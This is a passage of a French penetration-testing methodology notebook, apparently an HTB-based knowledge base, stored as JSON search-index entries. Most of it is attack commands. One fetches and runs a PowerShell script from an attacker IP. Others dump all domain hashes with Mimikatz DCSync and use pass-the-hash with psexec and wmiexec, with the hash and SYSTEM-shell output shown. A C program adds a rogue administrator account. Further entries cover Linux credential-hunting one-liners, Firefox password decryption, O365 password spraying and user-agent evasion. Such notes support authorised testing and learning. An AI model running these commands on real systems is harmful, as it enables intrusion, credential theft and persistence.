'c:\\\\Windows\\\\.*' }\n\n# V\u00e9rifier les permissions\n&gt; icacls 'C:\\Program Files\\Ext2Fsd\\Ext2Srv.exe'\nC:\\Program Files\\Ext2Fsd\\Ext2Srv.exe AUTORITE NT\\Syst\u00e8me:(I)(F)\n                                     BUILTIN\\Administrateurs:(I)(F)\n                                     BUILTIN\\Utilisateurs:(I)(RX)\n                                     AUTORIT\u00c9 DE PACKAGE D\u2019APPLICATION\\TOUS LES PACKAGES D\u2019APPLICATION:(I)(RX)\n                                     AUTORIT\u00c9 DE PACKAGE D\u2019APPLICATION\\TOUS LES PACKAGES D\u2019APPLICATION RESTREINTS:(I)(RX)\n</code></pre> <p>Documentation icacls</p> <ul> <li>A sequence of simple rights (basic permissions):<ul> <li>F - Full access</li> <li>M - Modify access</li> <li>RX - Read and execute access</li> <li>R - Read-only access</li> <li>W - Write-only access</li> </ul> </li> <li>Inheritance rights may precede either\u00a0<code>&lt;perm&gt;</code>\u00a0form:<ul> <li>(I)\u00a0- Inherit. ACE inherited from the parent container.</li> <li>(OI)**\u00a0- Object inherit. Objects in this container will inherit this ACE. Applies only to directories.</li> <li>(CI)\u00a0- Container inherit. Containers in this parent container will inherit this ACE. Applies only to directories.</li> <li>(IO)\u00a0- Inherit only. ACE inherited from the parent container, but does not apply to the object itself. Applies only to directories.</li> <li>(NP)\u00a0- Do not propagate inherit. ACE inherited by containers and objects from the parent container, but does not propagate to nested containers. Applies only to directories.</li> </ul> </li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Syst%C3%A8me%20d%27exploitation/","title":"Syst\u00e8me d'exploitation","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Syst%C3%A8me%20d%27exploitation/#version-de-windows","title":"Version de Windows","text":"<pre><code># Si on souhaite les informations du syst\u00e8me d'exploitation uniquement on pourra utiliser cette commande\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\n\n[environment]::OSVersion.Version\n\nMajor  Minor  Build  Revision\n-----  -----  -----  --------\n10     0      14393  0\n</code></pre> <p>On trouvera sur ce site la version exacte de Windows en fonction de la version du noyau remont\u00e9 par les commandes suivantes</p> <p>Liste des Versions Windows</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Syst%C3%A8me%20d%27exploitation/#escalade-de-privileges","title":"Escalade de privil\u00e8ges","text":"<p>Selon la version du syst\u00e8me d'exploitation, on pourra utiliser un des outils suivants pour trouver des exploits qui pourraient fonctionner sur la machine cible :</p> <ul> <li>Avant Windows Server 2016 : https://github.com/rasta-mouse/Sherlock</li> <li>Windows Server 2016 et sup\u00e9rieur : https://github.com/rasta-mouse/Watson</li> </ul> <p>On peut aussi tenter https://github.com/AonCyberLabs/Windows-Exploit-Suggester</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Syst%C3%A8me%20d%27exploitation/#sherlock-versions-anciennes-de-windows","title":"Sherlock (versions anciennes de windows)","text":"<p>** Remarque** : Sherlock affiche une liste de vuln\u00e9rabilit\u00e9 avec un <code>VulnStatus</code> qui peut \u007favoir la valeur <code>Not Vulnerable</code>. J'ai pu constater que m\u00eame si il \u00e9tait marqu\u00e9 <code>Not Vulnerable</code>, certains exploits fonctionnent tout de m\u00eame.... Cela peut donc \u00eatre int\u00e9ressant de tenter m\u00eame d'autres exploits qui serait consid\u00e9r\u00e9s comme \"Non Applicable\" (Attention \u00e0 la stabilit\u00e9 du syst\u00e8me !)</p> <pre><code>iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.42/Sherlock.ps1'));Find-AllVulns\nImport-Module .\\Sherlock.ps1\nFind-AllVulns\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Syst%C3%A8me%20d%27exploitation/#windows-exploit-suggester","title":"Windows Exploit suggester","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Syst%C3%A8me%20d%27exploitation/#installation","title":"Installation","text":"<pre><code>curl -LO https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py\n# d\u00e9pendances\nsudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz\nsudo tar -xf setuptools-2.0.tar.gz\npushd setuptools-2.0/\nsudo python2.7 setup.py install\npopd\n\nsudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz\nsudo tar -xf xlrd-1.0.0.tar.gz\npushd xlrd-1.0.0/\nsudo python2.7 setup.py install\npopd\n# mise \u00e0 jour de la DB\nsudo python2.7 windows-exploit-suggester.py --update\n</code></pre> <pre><code># ex\u00e9cuter sur la cible \n# &gt; systeminfo &gt; info.txt \nsudo python2.7 windows-exploit-suggester.py -d 2023-11-12-mssb.xls -i /tmp/info.txt   \n</code></pre> <pre><code>sudo python2.7 windows-exploit-suggester.py -d 2023-11-12-mssb.xls -i /workspa\n[*] initiating winsploit version 3.3...\n[*] database file detected as xls or xlsx based on extension\n[*] attempting to read from the systeminfo input file\n[+] systeminfo input file read successfully (ascii)\n[*] querying database file for potential vulnerabilities\n[*] comparing the 100 hotfix(es) against the 407 potential bulletins(s) with a database of 137 known exploits\n[*] there are now 206 remaining vulns\n[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin\n[+] windows version identified as 'Windows 2008 R2 SP1 64-bit'\n[*] \n[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important\n[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)\n[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)\n[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255\n[*] \n[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important\n[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)\n[*] \n[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important\n[*]   https://github.com/foxglovesec/RottenPotato\n[*]   https://github.com/Kevin-Robertson/Tater\n[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege\n[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation\n[*] \n[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important\n[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Discl\n[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC\n[*] \n[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical\n[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC\n[*] \n[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important\n[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF\n[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC\n[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC\n[*] \n[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important\n[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC\n[*] \n[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important\n[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC\n[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC\n[*] \n[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical\n[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)\n[*] \n[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important\n[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC\n[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF\n[*] \n[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical\n[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC\n[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-0\n[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC\n[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF\n[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF\n[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF\n[*] \n[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important\n[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC\n[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF\n[*] \n[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important\n[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC\n[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC\n[*] \n[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important\n[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC\n[*] \n[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical\n[*] done\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Taches%20plannifi%C3%A9es/","title":"Taches plannifi\u00e9es","text":"<pre><code>schtasks /query /fo LIST /v\n</code></pre> <pre><code># Donne quelques d\u00e9tails sur les t\u00e2ches plannifi\u00e9es \u00e0 la racine ('\\')\nGet-ScheduledTask | ?{$_.TaskPath -eq \"\\\"} | % { \n    Write-Host \"###################### $_.TaskName  ######################\"\n    Write-Host \"#\"\n    Write-Host \"###### ACTIONS\"\n    Write-Host \"#\"\n    $_.Actions | ConvertTo-Json -Depth 10\n    Write-Host \"#\"\n    Write-Host \"###### TRIGGERS\"\n    Write-Host \"#\"\n    $_.Triggers | ConvertTo-Json -Depth 10\n    Write-Host \"#\"\n    Write-Host \"#\"\n    Write-Host \"#\"\n    Write-Host \"#\"\n    Write-Host \"#\"\n    Write-Host \"#\"\n    Write-Host \"#\"\n    Write-Host \"#\"\n}\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Vol%20de%20hashs/","title":"Vol de hashs","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Vol%20de%20hashs/#dump-de-la-base-ntdsdit","title":"dump de la base NTDS.DIT","text":"<p>Penser \u00e0 bypasser l'EDR en place !!</p> <ul> <li>On upload <code>Mimikatz.exe</code></li> <li>On ex\u00e9cute ensuite : <code>mimikatz.exe \"lsadump::dcsync /domain:flight.htb /all /csv\"</code> ![[Flight-13.png]]</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Windows/Locale/Vol%20de%20hashs/#verification-des-acces","title":"V\u00e9rification des acc\u00e8s","text":"<p>Grace \u00e0 ces hashes collect\u00e9s, nous pourrons nous reconnecter via l'attaque Pass The Hash \u00e0 distance \u00e0 la machine en tant qu'administrateur du domaine, sans disposer du mot de passe de cet utilisateur :</p> <p>```shell title=\"Utilisation du Hash NT r\u00e9cup\u00e9r\u00e9 avec wmiexec.py\" $ wmiexec.py  -hashes :43bbfc530bab76141b12c8446e30c17c -dc-ip $TARGET_IP flight.htb/Administrator@$TARGET_IP whoami Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</p> <p>[*] SMBv3.0 dialect used flight\\administrator</p> <pre><code>```shell title=\"Utilisation du Hash NT r\u00e9cup\u00e9r\u00e9 avec psexec.py\"\n$ psexec.py Administrator@$TARGET_IP -hashes :43bbfc530bab76141b12c8446e30c17c\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.11.187.....\n[*] Found writable share ADMIN$\n[*] Uploading file BVTQqKla.exe\n[*] Opening SVCManager on 10.10.11.187.....\n[*] Creating service gxjC on 10.10.11.187.....\n[*] Starting service gxjC.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.2989]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n</code></pre> <p><code>shell title=\"Utilisation du Hash NT r\u00e9cup\u00e9r\u00e9 avec crackmapexec\" \u2514\u2500$ cme smb $TARGET_IP -u Administrator -H 43bbfc530bab76141b12c8446e30c17c --shares | cut -c60-       [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)       [+] flight.htb\\Administrator:43bbfc530bab76141b12c8446e30c17c (Pwn3d!)       [+] Enumerated shares       Share           Permissions     Remark       -----           -----------     ------       ADMIN$          READ,WRITE      Remote Admin       C$              READ,WRITE      Default share       IPC$            READ            Remote IPC       NETLOGON        READ,WRITE      Logon server share        Shared          READ                   SYSVOL          READ            Logon server share        Users           READ                   Web             READ</code></p>"},{"location":"_M%C3%A9thodologie/2-Obtention%20d%27acc%C3%A8s/Shells/","title":"Shells","text":"<p>[[Linux Shells]]</p> <p>[[WebShells]]</p> <p>[[Windows Shells]]</p>"},{"location":"_M%C3%A9thodologie/2-Obtention%20d%27acc%C3%A8s/Shells/#reverse-shells","title":"Reverse Shells","text":"<ul> <li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</li> <li>https://highon.coffee/blog/reverse-shell-cheat-sheet/</li> </ul>"},{"location":"_M%C3%A9thodologie/2-Obtention%20d%27acc%C3%A8s/Shells/#bind-shells","title":"Bind Shells","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md</p>"},{"location":"_M%C3%A9thodologie/4-Post%20Exploitation/Linux/Local/Credential%20Hunting/","title":"Credential Hunting","text":"<pre><code># Files / Configs\n## Affiche tous les fichiers de configuration trouv\u00e9s\nfor l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done\n\n## Affiche dans les fichiers pr\u00e9c\u00e9dents les lignes contenant des mots cl\u00e9s int\u00e9ressants\nfor i in $(find / -name *.cnf 2&gt;/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null | grep -v \"\\#\";done\n\n# Files / Databases\nfor l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done\n\n# Files / Notes\nfind /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"\n\n# Files / Scripts\nfor l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done\n\n# Files / Source codes\n\n# Files / Cronjobs\ncat /etc/crontab \nls -la /etc/cron.*/\n\n\n# Files / SSH Keys\n## Cl\u00e9s priv\u00e9es\ngrep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null | grep \":1\"\n## Cl\u00e9s publiques\ngrep -rnw \"ssh-rsa\" /home/* 2&gt;/dev/null | grep \":1\"\n# History / Logs\ntail -n5 /home/*/.bash*\n# History / Command-line History\nfor i in $(ls /var/log/* 2&gt;/dev/null);do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null); if [[ $GREP ]];then echo -e \"\\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null;fi;done\n\n# Memory / Cache\nsudo python3 mimipenguin.py\nsudo bash mimipenguin.sh \nsudo python2.7 laZagne.py all\n\n# Memory / In-memory Processing\n\n# Key-Rings / Browser stored credentials\nls -l .mozilla/firefox/ | grep default\ncat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .\npython3.9 firefox_decrypt.py # https://github.com/unode/firefox_decrypt\n</code></pre>"},{"location":"_M%C3%A9thodologie/4-Post%20Exploitation/Windows/Local/Credential%20Hunting/","title":"Credential Hunting","text":"<p>[[Recherche de fichiers int\u00e9ressants et credentials depuis Windows]]</p>"},{"location":"_M%C3%A9thodologie/Pentest/3-Production%20de%20rapports/Contenu/","title":"Contenu","text":"<p>Un rapport est l'\u00e9l\u00e9ment le plus important d'une prestation (pentest, \u00e9valuation de la s\u00e9curit\u00e9 ou autre).</p> <p>Il doit \u00eatre interprettable \u00e0 la fois par des experts techniques mais \u00e9galement comportant les informations qui int\u00e9resseront les d\u00e9cideurs.</p> <p>C'est grace aux \u00e9l\u00e9ments qu'il contiendra qu'un d\u00e9cideur de la direction (ex\u00e9cutif) pourra prendre conscience de la n\u00e9cessit\u00e9  de mettre en place les solutions pr\u00e9conis\u00e9es malgr\u00e9 les d\u00e9penses que cela repr\u00e9sentera.</p>"},{"location":"_M%C3%A9thodologie/Pentest/3-Production%20de%20rapports/Contenu/#elements-devant-etre-presents","title":"El\u00e9ments devant \u00eatre pr\u00e9sents","text":"<ul> <li>R\u00e9sum\u00e9 \u00e0 destination des ex\u00e9cutifs (Executive Summary)</li> <li>Vue d'ensemble de l'\u00e9valuation (Overview of Assessment)</li> <li>P\u00e9rim\u00e8tre (Scope)</li> <li>Vuln\u00e9rabilit\u00e9s et Recommendations (Vulnerabilities and Recommendations)</li> </ul>"},{"location":"_M%C3%A9thodologie/Pentest/3-Production%20de%20rapports/Contenu/#executive-summary","title":"Executive Summary","text":"<p>Il contiendra des \u00e9l\u00e9ments synth\u00e9tiques tel qu'un graphique qui pourra \u00eatre de cette forme :</p> <p>![[Pasted image 20230504215529.png]]</p>"},{"location":"_M%C3%A9thodologie/Pentest/3-Production%20de%20rapports/Contenu/#overview-of-assessment","title":"Overview of Assessment","text":"<p>Inclu les m\u00e9thodes utilis\u00e9es durant le processus d'\u00e9valuation.</p> <p>Il d\u00e9taillera l'execution de l'\u00e9valuation durant la p\u00e9riode de test.</p> <p>Il pr\u00e9sentera le processus, les outils utilis\u00e9s, etc.</p>"},{"location":"_M%C3%A9thodologie/Pentest/3-Production%20de%20rapports/Contenu/#scope","title":"Scope","text":"<p>Pr\u00e9sentera le p\u00e9rim\u00e8tre d\u00e9fini en collaboration avec le client :</p> <ul> <li>la liste des actifs autoris\u00e9es \u00e0 \u00eatre \u00e9valu\u00e9s</li> <li>la p\u00e9riode durant laquelle ces tests ont \u00e9t\u00e9 autoris\u00e9s</li> </ul>"},{"location":"_M%C3%A9thodologie/Pentest/3-Production%20de%20rapports/Contenu/#vulnerabilities-and-recommentations","title":"Vulnerabilities and Recommentations","text":"<p>D\u00e9taillera tout ce qui a \u00e9t\u00e9 d\u00e9couvert / identifi\u00e9 durant l'\u00e9valuation de vuln\u00e9rabilit\u00e9s (apr\u00e8s avoir \u00e9l\u00e9minin\u00e9 les faux positifs \u00e9ventuels).</p> <p>Il est pr\u00e9f\u00e9rable de regrouper ces \u00e9l\u00e9ments par gravit\u00e9 et/ou par le lien qu'ils peuvent avoir.</p> <p>Chaque vuln\u00e9rabilit\u00e9 \u00eatre d\u00e9taill\u00e9e avec les caract\u00e9ristiques suivantes :</p> <ul> <li>Nom de la vuln\u00e9rabilit\u00e9</li> <li>CVE</li> <li>CVSS</li> <li>Description du probl\u00e8me</li> <li>R\u00e9f\u00e9rences</li> <li>Actions de rem\u00e9diation</li> <li>Preuve de la pr\u00e9sence de la vuln\u00e9rabilit\u00e9 (m\u00e9thode de d\u00e9tection)</li> <li>Syst\u00e8mes affect\u00e9s</li> </ul>"},{"location":"_Techniques/Ajouter%20un%20module%20%C3%A0%20Metasploit/","title":"Ajouter un module \u00e0 Metasploit","text":"<p>Lorsque l'on trouve un exploit pr\u00eat \u00e0 l'emploi sur Internet et que cet exploit est con\u00e7u en tant que module metasploit il faut r\u00e9aliser l'op\u00e9ration suivante pour qu'il soit disponible dans la console <code>msfconsole</code> :</p>"},{"location":"_Techniques/Ajouter%20un%20module%20%C3%A0%20Metasploit/#creation-du-dossier-contenant-les-modules-personnalises","title":"Cr\u00e9ation du dossier contenant les modules personnalis\u00e9s","text":"<pre><code>cd /root\nmkdir -p /root/.msf4/modules/exploits/php/webapps/\ncd $_\n</code></pre>"},{"location":"_Techniques/Ajouter%20un%20module%20%C3%A0%20Metasploit/#recuperation-de-lexploit","title":"R\u00e9cup\u00e9ration de l'exploit","text":"<p>Pour notre exemple, on r\u00e9cup\u00e8rera l'exploit directement \u00e0 partir de <code>searchsploit</code> :</p> <pre><code>#searchsploit -m 50064\n  Exploit: Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)\n      URL: https://www.exploit-db.com/exploits/50064\n     Path: /usr/share/exploitdb/exploits/php/webapps/50064.rb\nFile Type: Ruby script, ASCII text\n\nCopied to: /root/.msf4/modules/exploits/php/webapps/50064.rb\n</code></pre>"},{"location":"_Techniques/Ajouter%20un%20module%20%C3%A0%20Metasploit/#mise-a-jour-de-la-base-de-donnee-msf","title":"Mise \u00e0 jour de la base de donn\u00e9e MSF","text":"<p>Fermer la console msfconsole si elle est lanc\u00e9e puis lancer en tant que root :</p> <pre><code>updatedb\n</code></pre> <p>Patienter un moment</p> <p>Puis relancer la console <code>msfconsole</code></p>"},{"location":"_Techniques/Ajouter%20un%20module%20%C3%A0%20Metasploit/#profit","title":"Profit","text":"<p>Il ne reste plusp qu'\u00e0 s\u00e9lectioner son module depuis la console :</p>"},{"location":"_Techniques/Chiffrer%20un%20fichier/","title":"Chiffrer un fichier","text":"<p>Lorsqu'on doit t\u00e9l\u00e9charger une donn\u00e9e sensible il est n\u00e9cessaire de la chiffre</p> <pre><code># T\u00e9l\u00e9charger le fichier https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1\n\nImport-Module .\\Invoke-AESEncryption.ps1\n\nInvoke-AESEncryption.ps1 -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt\n</code></pre> <pre><code># chiffrement\nopenssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc\n\n# d\u00e9chiffrement\nopenssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd     \n</code></pre>"},{"location":"_Techniques/Cr%C3%A9ation%20d%27un%20ex%C3%A9cutable%20pour%20lancer%20une%20commande/","title":"Cr\u00e9ation d'un ex\u00e9cutable pour lancer une commande","text":"<pre><code>cat adduser.c\n\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    int i;\n    i = system(\"net user evil P@$$w0rd /add\");\n    i = system(\"net localgroup administrators /add evil\");\n}\n</code></pre> <pre><code># cross compilation de l'ex\u00e9cutable\nsudo i686-w64-mingw32-gcc adduser.c -o adduser.exe\n</code></pre>"},{"location":"_Techniques/Enum%C3%A9ration%20d%27utilisateurs%20%C3%A0%20distance%20via%20la%20messagerie/","title":"Enum\u00e9ration d'utilisateurs \u00e0 distance via la messagerie","text":""},{"location":"_Techniques/Enum%C3%A9ration%20d%27utilisateurs%20%C3%A0%20distance%20via%20la%20messagerie/#service-smtp-pop-imap","title":"Service SMTP / POP / IMAP","text":"<p>Il est int\u00e9ressant de v\u00e9rifier les m\u00e9thodes autoris\u00e9es par les serveur SMTP car les outils d'\u00e9num\u00e9ration ne prennent pas forc\u00e9ment en compte la d\u00e9tection de m\u00e9thodes d\u00e9sactiv\u00e9es.</p> <p>Apr\u00e8s avoir v\u00e9rifier les m\u00e9thodes support\u00e9es, on pourra utiliser <code>smtp-user-enum</code> avec la m\u00e9thode fonctionnelle (RCPT, VRFY, etc)</p>"},{"location":"_Techniques/Enum%C3%A9ration%20d%27utilisateurs%20%C3%A0%20distance%20via%20la%20messagerie/#verification-des-methodes-fonctionnelles","title":"V\u00e9rification des m\u00e9thodes fonctionnelles","text":"<pre><code>ncat --crlf  $TARGET_IP 25\n220 TEST-DEV ESMTP\nEHLO machin     &lt;== il faut indiquer un nom d'h\u00f4te avant de pouvoir communiquer\n250-TEST-DEV\n250-SIZE 20480000\n250-AUTH LOGIN PLAIN\n250 HELP\nHELP            &lt;== /!\\ m\u00eame si on voit VRFY dans l'aide, il peut \u00eatre d\u00e9sactiv\u00e9 !!\n211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY\nVRFY aze\n502 VRFY disallowed.\n\n# V\u00e9rification du support de RCPT TO:\nMAIL FROM:&lt;rebrec@rebrec.com&gt;\n250 OK\nRCPT TO: aze       &lt;== /!\\ message lorsqu'on ne pr\u00e9cise pas le domaine\n550 A valid address is required.\nRCPT TO: aze@domain.com &lt;== /!\\ message lorsqu'on pr\u00e9cise un domaine a relayer\n530 SMTP authentication is required.\nRCPT TO:aze@maildomain.com  &lt;== /!\\ message lorsqu'on pr\u00e9cise le domaine de l'entreprise\n550 Unknown user   &lt;== la m\u00e9thode RCPT TO fonctionne donc\n</code></pre> <pre><code># https://github.com/pentestmonkey/smtp-user-enum\n/tools/smtp-user-enum/smtp-user-enum.pl -M RCPT -U userlist.txt -D maildomain.com -t $TARGET_IP\n\n# without domain\nsmtp-user-enum -m VRFY -l rebrec -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt  $TARGET 25  \n\n# with domain\n</code></pre>"},{"location":"_Techniques/Enum%C3%A9ration%20d%27utilisateurs%20%C3%A0%20distance%20via%20la%20messagerie/#office-365","title":"Office 365","text":"<p>O365spray</p> <pre><code># V\u00e9rification de l'utilisation d'O365 pour le domaine cible\npython3 o365spray.py --validate --domain $TARGET_DOMAIN\n\n# User enumeration\npython3 o365spray.py --enum -U users.list --domain $TARGET_DOMAIN\n\n# Password spraying\npython3 o365spray.py --spray -U validusers.txt -p 'P@ssw0rd' --count 1 --lockout 1 --domain $TARGET_DOMAIN\n</code></pre>"},{"location":"_Techniques/Compilation/Compilation%20d%27exploit%20windows%20en%20language%20C%2B%2B/","title":"Compilation d'exploit windows en language C++","text":"<pre><code># Installer mingw puis\ncd c:\\Program Files\\mingw-w64\\i686-7.2.0-posix-dwarf-rt_v5-rev1\n\n# initialisation des variable d'environnement pour pouvoir utiliser le compilateur\nmingw-w64.bat\n\n# compilation\ngcc exploit.c -o exploit.exe\n</code></pre> <pre><code># compilation d'un exploit qui utilise des extensions depuis Visual Studio : Menu Outils &gt; Ligne de commande &gt; Invite de commandes d\u00e9veloppeur\ncl /EHsc 41015.c /link /out:41015\n# /EHsc active la gestion des exceptions.\n# /link est utilis\u00e9 pour sp\u00e9cifier des options au compilateur de liens.\n# /out:41015 sp\u00e9cifie le nom de l'ex\u00e9cutable de sortie.\n</code></pre> <pre><code># Depuis Linux\n# -lntdll est utilis\u00e9 pour \u00e9viter l'erreur 'undefined reference to `DbgPrintEx''\n# -municode est utilis\u00e9 pour \u00e9viter l'erreur \"undefined reference to `WinMain@16'\"\ni686-w64-mingw32-gcc CVE-2016-7255.c -o CVE-2016-7255  -municode -lws2_32 -lntdll\n</code></pre>"},{"location":"_Techniques/Evasion/Modification%20de%20User-Agent/","title":"Modification de User Agent","text":"<p>Dans un environnement ayant mis en oeuvre des mesures de s\u00e9curit\u00e9, l'utilisation des User-Agents par d\u00e9faut pourrait \u00eatre d\u00e9tect\u00e9 assez facilement.</p> <p>Lors du t\u00e9l\u00e9chargement ou de l'envoie de nos payloads, il peut \u00eatre utile de modifier le User-Agent pour parra\u00eetre l\u00e9gitime.</p>"},{"location":"_Techniques/Evasion/Modification%20de%20User-Agent/#powershell","title":"Powershell","text":"<pre><code># Liste de User Agents\n[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label=\"User Agent\";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl\n\n\n# Modification du User 